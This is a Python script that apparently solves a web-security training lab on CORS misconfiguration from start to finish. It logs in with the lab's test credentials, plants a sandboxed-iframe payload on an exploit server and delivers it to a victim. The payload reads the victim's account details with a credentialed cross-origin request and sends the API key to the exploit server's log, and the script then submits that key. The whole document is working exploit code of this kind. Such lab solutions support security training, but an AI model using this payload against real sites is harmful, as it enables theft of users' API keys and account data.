import requests
import re
from urllib.parse import unquote_plus
import json
import sys


class Solver:
    def __init__(self, lab_url, exploit_server_url):
        self.lab_url = lab_url if lab_url.endswith('/') else lab_url + '/'
        self.exploit_server_url = exploit_server_url if exploit_server_url.endswith('/') else exploit_server_url + '/'
        self.session = requests.Session()
        self.csrf = None
        self.key = None

    @staticmethod
    def parsing_data(data_string):
        data_dict = {}
        for item in data_string.split('&'):
            key, value = item.split('=')
            data_dict[key] = value
        return data_dict

    def getting_csrf(self):
        response = self.session.get(self.lab_url + 'login')
        self.csrf = re.search('value="(.*)"', response.text).group(1)

    def signing_in(self):
        data = {
            'csrf': self.csrf,
            'username': 'wiener',
            'password': 'peter'
        }
        self.session.post(self.lab_url + 'login', data=data)

    def storing_and_delivering_the_exploit(self):
        payload = """<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
            var req = new XMLHttpRequest();
            req.onload = reqListener;
            req.open('get', '{}accountDetails' ,true);
            req.withCredentials = true;
            req.send();
            
            function reqListener() {{
            location='{}log?key='+this.responseText;
            }};
            </script>">\n</iframe>"""
        data_string = 'urlIsHttps=on&responseFile=%2Fexploit&responseHead=HTTP%2F1.1+200+OK%0D%0AContent-Type%3A+text%2Fhtml%3B+charset%3Dutf-8&formAction=STORE'
        data = self.parsing_data(data_string)
        for key, value in data.items():
            data[key] = unquote_plus(value)
        data['responseBody'] = payload.format(self.lab_url, self.exploit_server_url)
        self.session.post(self.exploit_server_url, data=data)
        data['formAction'] = 'DELIVER_TO_VICTIM'
        self.session.post(self.exploit_server_url, data=data)

    def extracting_the_key(self):
        response = self.session.get(self.exploit_server_url + 'log')
        victim_response = re.search(r'key=(.*) HTTP', response.text).groups()[0]
        key = json.loads(unquote_plus(victim_response))['apikey']
        self.key = key

    def submitting_the_solution(self):
        data = {
            'answer': self.key
        }
        self.session.post(self.lab_url + 'submitSolution', data)

    def checking_solution(self):
        response = self.session.get(self.lab_url)
        if 'Congratulations, you solved the lab!' in response.text:
            print('You solved the lab.')
            print('Coded by Mohamed Ahmed (ma4747gh).')
            print('My GitHub account: https://github.com/ma4747gh')
            print('My LinkedIn account: https://eg.linkedin.com/in/ma4747gh')

    def start(self):
        self.getting_csrf()
        self.signing_in()
        self.storing_and_delivering_the_exploit()
        self.extracting_the_key()
        self.submitting_the_solution()
        self.checking_solution()


solver = Solver(sys.argv[1], sys.argv[2])
solver.start()
